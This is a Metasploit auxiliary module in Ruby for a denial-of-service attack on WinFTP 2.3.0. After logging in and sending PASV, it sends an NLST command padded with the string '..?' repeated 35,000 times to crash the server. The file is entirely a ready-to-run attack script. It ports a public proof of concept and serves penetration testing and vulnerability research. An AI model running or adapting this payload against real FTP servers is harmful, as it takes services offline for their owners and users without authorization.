require 'msf/core'

module Msf
class Auxiliary::Dos::Windows::Ftp::Winftp230_nlst < Msf::Auxiliary

	include Exploit::Remote::Ftp

	def initialize(info = {})
		super(update_info(info,	
			'Name'           => 'WinFTP 2.3.0 NLST Denial of Service',
			'Description'    => %q{
				This module is a very rough port of Julien Bedard's
				PoC.  You need a valid login, but even anonymous can
				do it if it has permission to call NLST.
			},
			'Author'         => 'Kris Katterjohn <katterjohn@gmail.com>',
			'License'        => MSF_LICENSE,
			'Version'        => '1',
			'References'     =>
				[ [ 'URL', 'http://milw0rm.com/exploits/6581'] ],
			'DisclosureDate' => 'Sep 26 2008'))
	end

	def run
		connect_login

		raw_send_recv("PASV\r\n") # NLST has to follow a PORT or PASV

		sleep 1 # *sigh* this appears to be necessary in my tests

		raw_send("NLST #{'..?' * 35000}\r\n")

		disconnect
	end
end
end	

